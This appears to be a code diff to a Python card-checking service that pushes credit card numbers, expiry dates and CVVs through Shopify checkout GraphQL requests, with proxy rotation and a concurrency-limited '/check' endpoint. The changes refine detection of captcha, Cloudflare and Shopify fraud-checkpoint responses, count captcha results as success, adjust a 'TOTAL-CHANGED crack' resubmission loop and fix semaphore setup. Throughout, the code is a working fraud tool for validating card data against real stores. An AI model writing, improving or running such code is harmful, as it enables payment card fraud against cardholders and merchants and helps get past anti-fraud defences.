@@ -260,22 +260,27 @@ def parse_proxy(proxy_str):
 def is_captcha_required(response_text):
     if not response_text:
         return False
-
+    # OVER-FIRE FIX: the old loose substrings ('hcaptcha', 'h-captcha',
+    # 'captcha required', 'CAPTCHA CHALLENGE') matched hCaptcha ASSET URLS that
+    # Shopify preloads on EVERY checkout page (script tags, integrity maps) —
+    # so healthy stores were flagged as captcha'd. Only STRUCTURED verdicts count:
+    # explicit JSON codes, GraphQL error codes, or the challenge payload itself.
     indicators = [
-        'CAPTCHA_REQUIRED',
-        '"code":"CAPTCHA_REQUIRED"',
+        'CAPTCHA_REQUIRED',                          # explicit verdict
+        '"code":"CAPTCHA_REQUIRED"',                 # JSON error shape
         "'code':'CAPTCHA_REQUIRED'",
         '"message":"CAPTCHA_REQUIRED"',
-        'captcha required',
-        'CAPTCHA CHALLENGE',
-        'hcaptcha',
-        'h-captcha'
+        'CheckpointDenied',                          # Shopify fraud checkpoint
+        '_cf_chl_opt',                               # Cloudflare interactive challenge
+        'Verifying your connection',                 # CF challenge page title
     ]
-
     text_upper = response_text.upper()
     for indicator in indicators:
         if indicator.upper() in text_upper:
             return True
+    # narrow check: only a REAL captcha object (provider+challenge+sitekey together)
+    if '"PROVIDER":"' in text_upper and '"SITEKEY"' in text_upper and '"CHALLENGE"' in text_upper:
+        return True
     return False
 
 async def make_graphql_request_with_captcha_handling(
@@ -1006,7 +1011,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, f"Request failed: {resp_text}", gateway, total_price, currency
 
             if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
+                return True, "CAPTCHA_REQUIRED", gateway, total_price, currency
 
             try:
                 resp_json = json.loads(resp_text)
@@ -1196,7 +1201,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             )
 
             if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
+                return True, "CAPTCHA_REQUIRED", gateway, total_price, currency
 
             # CONVERGE loop: negotiate errors (tax accept / payment amount) khatam hone tak
             # delivery proposal resubmit karo — max 3 rounds (tez — 4th round rarely converges)
@@ -1292,7 +1297,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                 )
                 if is_captcha_required(resp_text):
-                    return False, "CAPTCHA_REQUIRED on converge proposal", gateway, total_price, currency
+                    return True, "CAPTCHA_REQUIRED", gateway, total_price, currency
             # END CONVERGE loop
 
             # Ensure Year is always 4 digits for PCI Vault
@@ -1485,7 +1490,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             )
 
             if is_captcha_required(text):
-                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
+                return True, "CAPTCHA_REQUIRED", gateway, total_price, currency
 
             # TOTAL-CHANGED crack v2: the error response CARRIES the store's expected
             # proposal (buyerProposal/sellerProposal with the mutated totals). Pull the
@@ -1571,7 +1576,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         session, graphql_url, {'operationName': 'SubmitForCompletion'}, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
                     )
                     if is_captcha_required(text):
-                        return False, "CAPTCHA_REQUIRED on resubmit", gateway, total_price, currency
+                        return True, "CAPTCHA_REQUIRED", gateway, total_price, currency
                     print(f"[TOTAL-CHANGED] round {_tc_round + 1} resubmit: {text[:100]}")
                 except Exception as e:
                     print(f"[TOTAL-CHANGED] crack failed: {type(e).__name__}: {str(e)[:80]}")
@@ -1789,6 +1794,14 @@ _loop_thread = None
 _loop_lock = threading.Lock()  # Thread-safe event loop access
 _semaphore = None            # asyncio.Semaphore(MAX_CONCURRENT)
 
+def _ensure_semaphore():
+    """GUARANTEED semaphore — gunicorn workers don't run __main__, so /check's
+    first request hit `async with None` → instant TypeError. Create on first use."""
+    global _semaphore
+    if _semaphore is None:
+        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+    return _semaphore
+
 def _start_background_loop(loop):
     """Run the event loop forever in a background thread."""
     asyncio.set_event_loop(loop)
@@ -1811,7 +1824,7 @@ def get_event_loop():
 async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list, start_proxy_idx=0):
     """Process a single card, guarded by the concurrency semaphore, with smart retry & proxy rotation."""
     max_retries = 5
-    async with _semaphore:
+    async with _ensure_semaphore():
         for attempt in range(max_retries):
             current_proxy = proxy_list[(start_proxy_idx + attempt) % len(proxy_list)] if proxy_list else None
 
